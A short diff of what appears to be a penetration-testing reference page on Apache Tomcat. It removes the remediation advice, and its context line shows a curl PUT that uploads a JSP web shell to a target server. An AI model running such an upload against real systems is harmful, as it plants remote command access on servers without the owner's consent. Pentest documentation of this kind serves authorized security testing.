@@ -57,11 +57,6 @@ curl -X PUT http://$TARGET:8080/shell.jsp/ --data-binary @shell.jsp
     Manager deploys leave access-log entries and a WAR on disk. Undeploy and clean
     up on real engagements; note the artifact in your report.
 
-## :material-shield-check: Remediation
-
-- Change/disable default manager accounts; restrict `/manager` by IP; disable the
-  AJP connector if unused; patch Tomcat.
-
 ## :material-link-variant: Related
 
 - Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
